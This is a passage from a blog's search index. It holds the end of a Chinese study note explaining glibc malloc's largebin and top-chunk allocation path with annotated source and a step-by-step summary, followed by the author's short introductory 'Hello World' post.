class="line">           alloc_perturb (p, bytes);</span><br><span class="line">           <span class="keyword">return</span> p;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>前面部分的代码是用 binmap 快速查询，后面的代码和之前一样。</p>
<p>largebin 分配过程图示：</p>
<p><img src="https://z3.ax1x.com/2021/05/16/gg7unJ.png"></p>
<p>largebin 的分配过程是最复杂的，原因是largebin chunk的结构本身就更复杂，还有之前在 fastbin、smallbin、unsorted bin的分配都失败了，但是之前分配时对 chunk 进行了整理后可能就出现了合适的 chunk，为了减少对操作系统申请内存的次数在这里就要尽量把可能的 chunk 全部检查一遍。</p>
<p>若到这里都不能成功分配 chunk，就使用 top chunk</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">use_top:</span><br><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">        If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">        (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">        search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">        less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">        be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">        limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">        MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">        exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">        reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">        to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">     victim = av-&gt;top;  <span class="comment">//获取top chunk的起始地址</span></span><br><span class="line">     size = chunksize (victim);  <span class="comment">//获取top chunk 的大小</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))  <span class="comment">//足够分配则切割分配</span></span><br><span class="line">       &#123;</span><br><span class="line">         remainder_size = size - nb;</span><br><span class="line">         remainder = chunk_at_offset (victim, nb);</span><br><span class="line">         av-&gt;top = remainder;</span><br><span class="line">         set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                   (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">         set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">         check_malloced_chunk (av, victim, nb);</span><br><span class="line">         <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">         alloc_perturb (p, bytes);</span><br><span class="line">         <span class="keyword">return</span> p;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">        here for all block sizes.  */</span></span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))  <span class="comment">//不够但还有fastbins就整理fastbins再尝试</span></span><br><span class="line">       &#123;</span><br><span class="line">         malloc_consolidate (av);</span><br><span class="line">         <span class="comment">/* restore original bin index */</span></span><br><span class="line">         <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">           idx = smallbin_index (nb);</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           idx = largebin_index (nb);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">     <span class="keyword">else</span>  <span class="comment">//fastbins也空了就调用sysmalloc</span></span><br><span class="line">       &#123;</span><br><span class="line">         <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">         <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">           alloc_perturb (p, bytes);</span><br><span class="line">         <span class="keyword">return</span> p;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>尝试在 top chunk 分配，若 top chunk 足够则直接切割，若不够但还有 fastbin 就执行 <code>malloc_consolidate</code>整理 fastbin 之后再尝试，fastbin 也没有则调用 sysmalloc 申请新的空间。</p>
<blockquote>
<p>为什么还要检查 fastbin？ 两个原因，一是如果开启了 ATOMIC_FASTBINS ，由于 free fastbin chunk 的时候不需要加锁，所以 malloc 走到这一步的时候可能已经有其他线程向 fastbin 中注入了新的 chunk，另外一个原因是如果 nb 是一个 smallbin chunk，走到这一步说明之前所有的分配操作都失败了，但是在分配 smallbin chunk 的时候始终都没有调用过 malloc_consolidate，所以在 malloc 尾声的时候可以尝试合并 fastbin chunk 构造出符合要求的 chunk。</p>
</blockquote>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>获取分配区的锁。</li>
<li>将用户的请求大小转换为实际需要分配的 chunk 空间大小。</li>
<li>判断所需分配 chunk 是否在 fastbin 区域，如果是的话， 则转下一步，否则跳到第 5 步。</li>
<li>首先尝试在 fastbins 中取一个所需大小的 chunk 分配给用户。 如果可以找到， 则分配结束。 否则转到下一步。</li>
<li>判断所需大小是否处在 small bins 中，如果 chunk 大小处在 smallbins 中，则转下一步，否则转到第 7 步。</li>
<li>根据所需分配的 chunk 的大小， 找到具体所在的某个 smallbin，从该 bin 的尾部摘取一个恰好满足大小的 chunk。 若成功，则分配结束，否则转到下一步。</li>
<li>到了这一步， 说明需要分配的是一块大的内存，或者 small bins 中找不到合适的chunk。于是，ptmalloc 首先会遍历 fastbins 中的 chunk，将相邻的 chunk 进行合并，并链接到 unsorted bin 中， 然后遍历 unsorted bin 中的 chunk，如果 unsorted bin 只有一个 chunk，并且这个 chunk 在上次分配时被使用过，并且所需分配的 chunk 大小属于 small bins，并且 chunk 的大小大于等于需要分配的大小，这种情况下就直接将该 chunk 进行切割，分配结束，否则将根据 chunk 的空间大小将其放入 smallbins 或是 large bins 中，遍历完成后，转入下一步。</li>
<li>到了这一步，说明需要分配的是一块大的内存，或者 small bins 和 unsorted bin 中都找不到合适的 chunk，并且 fast bins 和 unsorted bin 中所有的 chunk 都清除干净了。 从 large bins 中按照“smallest-first， best-fit”原则， 找一个合适的 chunk， 从中划分一块所需大小的 chunk， 并将剩下的部分链接回到 bins 中。 若操作成功， 则分配结束， 否则转到下一步。</li>
<li>如果搜索 fast bins 和 bins 都没有找到合适的 chunk， 那么就需要操作 top chunk 来进行分配了。 判断 top chunk 大小是否满足所需 chunk 的大小， 如果是， 则从 topchunk 中分出一块来。 否则转到下一步。</li>
<li>到了这一步， 说明 top chunk 也不能满足分配要求， 所以， 于是就有了两个选择: 如果是主分配区， 调用 sbrk()， 增加 top chunk 大小； 如果是非主分配区，调用 mmap来分配一个新的 sub-heap，增加 top chunk 大小； 或者使用 mmap()来直接分配。 在这里， 需要依靠 chunk 的大小来决定到底使用哪种方法。 判断所需分配的 chunk大小是否大于等于 mmap 分配阈值， 如果是的话， 则转下一步， 调用 mmap 分配，否则跳到第 12 步， 增加 top chunk 的大小。</li>
<li>使用 mmap 系统调用为程序的内存空间映射一块 chunk_size align 4kB 大小的空间。然后将内存指针返回给用户。</li>
<li>判断是否为第一次调用 malloc， 若是主分配区， 则需要进行一次初始化工作， 分配一块(chunk_size + 128KB) align 4KB 大小的空间作为初始的 heap。 若已经初始化过了， 主分配区则调用 sbrk()增加 heap 空间， 分主分配区则在 top chunk 中切割出一个 chunk， 使之满足分配需求， 并将内存指针返回给用户。</li>
</ol>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Linux</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2019/04/29/Hello-World/</url>
    <content><![CDATA[<p>Welcome to my Blog.</p>
<h2 id="Who-am-I"><a href="#Who-am-I" class="headerlink" title="Who am I"></a>Who am I</h2><p>我是西南科技大学的学生，喜欢玩安全，目前只是小白一枚，还在新手村瞎折腾，欢迎各位大佬指教，最好是能带带我…关于计算机和网络的很多其他东西也都很有趣，也欢迎大家和我交流。</p>
<h2 id="What-other-hobbies-do-I-have"><a href="#What-other-hobbies-do-I-have" class="headerlink" title="What other hobbies do I have"></a>What other hobbies do I have</h2><p>平时闲的时候我喜欢喝喝茶，看看书，逗逗小猫小狗，看看电影什么的，喜欢自然，纯真的事物，喜欢自娱自乐。</p>
<p>My QQ &amp; WeChat: 2764039009</p>
<p>All grown-ups were once children——although few of them remember it.</p>
]]></content>
  </entry>
</search>
